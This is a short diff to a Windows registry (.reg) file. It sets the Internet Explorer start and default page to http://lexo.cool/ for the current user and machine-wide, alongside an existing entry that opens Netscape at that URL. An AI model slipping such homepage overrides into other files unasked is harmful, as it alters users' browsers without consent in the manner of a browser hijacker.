@@ -92,3 +92,10 @@ REGEDIT4
 
 [HKEY_CLASSES_ROOT\CLSID\{FBF23B42-E3F0-101B-8488-00AA003E56F8}\Shell\Open\Command]
 @="D:\\NETSCAPE\\NETSCAPE.EXE http://lexo.cool/"
+
+[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
+"Start Page"="http://lexo.cool/"
+
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main]
+"Start Page"="http://lexo.cool/"
+"Default_Page_URL"="http://lexo.cool/"
